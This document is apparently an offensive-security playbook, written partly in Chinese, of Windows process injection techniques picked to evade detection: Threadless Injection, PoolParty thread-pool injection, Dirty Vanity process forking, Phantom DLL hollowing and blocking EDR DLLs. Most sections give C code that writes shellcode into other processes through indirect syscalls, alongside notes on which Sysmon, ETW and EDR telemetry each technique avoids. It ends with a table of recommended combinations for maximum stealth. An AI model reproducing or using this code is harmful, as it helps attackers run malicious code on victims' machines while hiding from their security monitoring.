# Process Manipulation Techniques (High-OPSEC Only)

> 所有技术均为 🟢 Low OPSEC，无 CreateRemoteThread/SetThreadContext 等经典注入签名。
> **已移除**: Process Hollowing (🔴), Classic Remote Injection (🔴), PPID Spoofing,
> Process Argument Spoofing, Ghost Process Injection, Herpaderping

---

## 1. Threadless Injection (Remote Function Hooking)

> OPSEC: 🟢 Low
> Sysmon: Event ID 10 (ProcessAccess) — 但无 Event ID 8 (CreateRemoteThread)
> ETW: 无线程创建遥测
> EDR Hooks: 无 NtCreateThreadEx/QueueUserAPC 调用
> 优势: 零线程创建，执行由目标进程自然调用触发
> 来源: CCob/ThreadlessInject

原理：
1. 在目标进程中找到一个频繁被调用的导出函数 (如 ntdll!RtlAllocateHeap)
2. 在目标进程分配 RWX shellcode 内存
3. 将目标函数的前几字节替换为 jmp 到 shellcode 的 trampoline
4. Shellcode 执行后恢复原始字节并跳回
5. 执行时机: 目标进程下次调用该函数时自然触发

```c
void ThreadlessInject(DWORD dwPid, PVOID pShellcode, SIZE_T szShellcode) {
    // 1. 打开目标进程 (indirect syscall)
    HANDLE hProc = NULL;
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwPid, NULL };
    SYSCALL_ENTRY ntOpen = FindSyscall(pNtdll, HASH_NtOpenProcess);
    IndirectSyscall(&ntOpen, &hProc, PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
                    &oa, &cid);

    // 2. 在目标进程分配内存 (RW)
    PVOID pRemote = NULL; SIZE_T allocSize = szShellcode + 0x100; // +trampoline
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    IndirectSyscall(&ntAlloc, hProc, &pRemote, 0, &allocSize,
                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    // 3. 写入 shellcode + 恢复 trampoline
    // trampoline: 恢复原始字节 → 执行 shellcode → jmp 回原函数
    BYTE trampoline[64];
    // ... 构建 trampoline (保存原始字节 + shellcode 地址 + 恢复逻辑) ...
    SYSCALL_ENTRY ntWrite = FindSyscall(pNtdll, HASH_NtWriteVirtualMemory);
    IndirectSyscall(&ntWrite, hProc, pRemote, pShellcode, szShellcode, NULL);

    // 4. 改为 RX
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    ULONG oldProt;
    IndirectSyscall(&ntProt, hProc, &pRemote, &allocSize, PAGE_EXECUTE_READ, &oldProt);

    // 5. Hook 目标函数 (覆写前 14 字节为 jmp [addr])
    // 目标: ntdll!RtlAllocateHeap (频繁调用)
    PVOID pTarget = GetRemoteExportAddr(hProc, L"ntdll.dll", "RtlAllocateHeap");
    BYTE hook[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 }; // jmp [rip+0]
    *(PVOID*)(hook + 6) = pRemote;  // shellcode 地址

    // 保存原始字节 (写入 trampoline 区域供恢复)
    BYTE origBytes[14];
    SYSCALL_ENTRY ntRead = FindSyscall(pNtdll, HASH_NtReadVirtualMemory);
    IndirectSyscall(&ntRead, hProc, pTarget, origBytes, 14, NULL);

    // 写入 hook
    PVOID pHookAddr = pTarget; SIZE_T hookSize = 14;
    IndirectSyscall(&ntProt, hProc, &pHookAddr, &hookSize, PAGE_READWRITE, &oldProt);
    IndirectSyscall(&ntWrite, hProc, pTarget, hook, 14, NULL);
    IndirectSyscall(&ntProt, hProc, &pHookAddr, &hookSize, oldProt, &oldProt);

    // 6. 等待目标进程自然调用 RtlAllocateHeap → 触发执行
}
```

---

## 2. PoolParty — Thread Pool Injection (Remote)

> OPSEC: 🟢 Low
> Sysmon: 无 CreateRemoteThread 事件
> ETW: 线程池操作是合法 Windows 机制
> EDR Hooks: Worker Factory 内部结构不被监控
> 优势: 8 种变体，滥用合法线程池机制，绕过所有主流 EDR
> 来源: SafeBreach-Labs/PoolParty

### Variant 7: TP_WORK (最稳定)

```c
void PoolPartyInject(HANDLE hProc, PVOID pShellcode, SIZE_T szShellcode) {
    // 1. 在目标进程分配 + 写入 shellcode (RX)
    PVOID pRemote = NULL; SIZE_T sz = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    IndirectSyscall(&ntAlloc, hProc, &pRemote, 0, &sz,
                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    SYSCALL_ENTRY ntWrite = FindSyscall(pNtdll, HASH_NtWriteVirtualMemory);
    IndirectSyscall(&ntWrite, hProc, pRemote, pShellcode, szShellcode, NULL);
    ULONG oldProt;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    IndirectSyscall(&ntProt, hProc, &pRemote, &sz, PAGE_EXECUTE_READ, &oldProt);

    // 2. 查询目标进程的 Worker Factory handle
    // NtQueryInformationProcess → ProcessHandleInformation
    // 找到类型为 "TpWorkerFactory" 的 handle
    HANDLE hWorkerFactory = FindWorkerFactoryHandle(hProc);

    // 3. 查询 Worker Factory 信息获取 TP_POOL 地址
    WORKER_FACTORY_BASIC_INFORMATION wfbi;
    SYSCALL_ENTRY ntQueryWf = FindSyscall(pNtdll, HASH_NtQueryInformationWorkerFactory);
    IndirectSyscall(&ntQueryWf, hWorkerFactory, 7/*WorkerFactoryBasicInformation*/,
                    &wfbi, sizeof(wfbi), NULL);

    // 4. 构造 TP_WORK 结构并写入目标进程
    // TP_WORK.Task.pFunction = shellcode 地址
    FULL_TP_WORK tpWork = {0};
    tpWork.CleanupGroupMember.Pool = wfbi.StartParameter; // TP_POOL*
    tpWork.Task.ListEntry.Flink = &tpWork.Task.ListEntry; // self-referencing
    tpWork.Task.ListEntry.Blink = &tpWork.Task.ListEntry;
    tpWork.ShellcodeAddr = pRemote;  // callback function pointer

    PVOID pRemoteWork = NULL; SIZE_T workSz = sizeof(tpWork);
    IndirectSyscall(&ntAlloc, hProc, &pRemoteWork, 0, &workSz,
                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    IndirectSyscall(&ntWrite, hProc, pRemoteWork, &tpWork, sizeof(tpWork), NULL);

    // 5. 将 TP_WORK 插入目标进程的线程池队列
    // 修改 TP_POOL.TaskQueue 链表插入我们的 work item
    // 下次线程池 worker 取任务时执行 shellcode
}
```

### Variant 3: TP_TIMER (定时触发)

```c
// 类似 TP_WORK 但使用 TP_TIMER
// 优势: 可以设置延迟执行时间
// 通过 NtSetTimer2 设置定时器触发 shellcode
```

---

## 3. Dirty Vanity — Process Forking

> OPSEC: 🟢 Low
> Sysmon: 无标准进程创建事件 (fork 不触发 Event ID 1)
> ETW: RtlCreateProcessReflection 极少被监控
> EDR Hooks: 进程反射 API 不在标准 hook 列表中
> 优势: Fork 后子进程继承所有内存，无需跨进程写入
> 来源: deepinstinct/Dirty-Vanity

```c
void DirtyVanityInject(PVOID pShellcode, SIZE_T szShellcode) {
    // 1. 在当前进程分配 + 写入 shellcode
    PVOID pMem = NULL; SIZE_T sz = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    IndirectSyscall(&ntAlloc, NtCurrentProcess(), &pMem, 0, &sz,
                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    __movsb((PBYTE)pMem, (PBYTE)pShellcode, szShellcode);
    ULONG oldProt;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    IndirectSyscall(&ntProt, NtCurrentProcess(), &pMem, &sz, PAGE_EXECUTE_READ, &oldProt);

    // 2. Fork 当前进程 — 子进程继承所有内存 (包括 shellcode)
    typedef NTSTATUS (NTAPI* fnRtlCreateProcessReflection)(
        HANDLE, ULONG, PVOID, PVOID, HANDLE, PRTL_PROCESS_REFLECTION_INFORMATION);
    fnRtlCreateProcessReflection pReflect =
        (fnRtlCreateProcessReflection)PebGetProc(pNtdll, HASH_RtlCreateProcessReflection);

    RTL_PROCESS_REFLECTION_INFORMATION info = {0};
    // StartRoutine = shellcode 地址 (在 fork 后的子进程中执行)
    pReflect(NtCurrentProcess(),
             RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED,
             pMem,   // StartRoutine — shellcode
             NULL,   // StartContext
             NULL,   // EventHandle
             &info);

    // 3. Resume forked process
    SYSCALL_ENTRY ntResume = FindSyscall(pNtdll, HASH_NtResumeThread);
    IndirectSyscall(&ntResume, info.ThreadHandle, NULL);
}
```

---

## 4. Module Stomping (Phantom DLL Hollowing — Remote)

> OPSEC: 🟢 Low
> Sysmon: 看起来像正常 DLL 加载
> ETW: 内存区域为 MEM_IMAGE (file-backed)
> EDR Hooks: 内存扫描器认为是合法 DLL
> 优势: 绕过 Moneta/PE-sieve 等内存扫描工具
> 来源: forrest-orr/phantom-dll-hollower-poc

```c
void PhantomDllRemote(HANDLE hProc, PVOID pShellcode, SIZE_T szShellcode) {
    // 1. 在目标进程中加载一个合法但不常用的 DLL
    // 使用 NtCreateSection(SEC_IMAGE) + NtMapViewOfSection
    // 选择 .text section >= shellcode 大小的 DLL

    // 2. 找到映射后的 .text section 地址
    // 3. NtProtectVirtualMemory → RW
    // 4. NtWriteVirtualMemory → 覆写 .text 为 shellcode
    // 5. NtProtectVirtualMemory → RX
    // 6. 通过 Threadless Injection 或 PoolParty 触发执行

    // 内存扫描器看到: file-backed MEM_IMAGE 区域
    // 不会标记为可疑 (与 private RWX/RX 不同)
}
```

---

## 5. Block DLL Policy (辅助技术)

> OPSEC: 🟢 Low
> Sysmon: 进程创建属性中的 mitigation policy
> ETW: 合法的进程 mitigation flag
> EDR Hooks: 无 — 这是 Windows 安全特性
> 优势: 阻止 EDR DLL 注入到子进程，Chrome/Edge 也使用此技术

```c
// 创建子进程时阻止非 Microsoft 签名的 DLL 加载
void CreateWithBlockDll(LPCWSTR wszExe) {
    STARTUPINFOEXW si = {0};
    si.StartupInfo.cb = sizeof(si);
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    PROCESS_INFORMATION pi;
    CreateProcessW(wszExe, NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
        &si.StartupInfo, &pi);
    // EDR DLL 无法注入此进程
}
```

---

## 实战组合建议

| 目标 | 推荐组合 | 原因 |
|------|----------|------|
| 本地执行 | Phantom DLL Hollowing + Fiber | File-backed 内存 + 无线程创建 |
| 远程注入 (快速) | Threadless Inject | 最简单，零线程创建 |
| 远程注入 (隐蔽) | PoolParty TP_WORK | 利用合法线程池机制 |
| 远程注入 (最高) | Phantom DLL Remote + PoolParty | File-backed + 线程池触发 |
| 需要子进程 | Dirty Vanity + Block DLL | Fork 继承内存 + 阻止 EDR DLL |

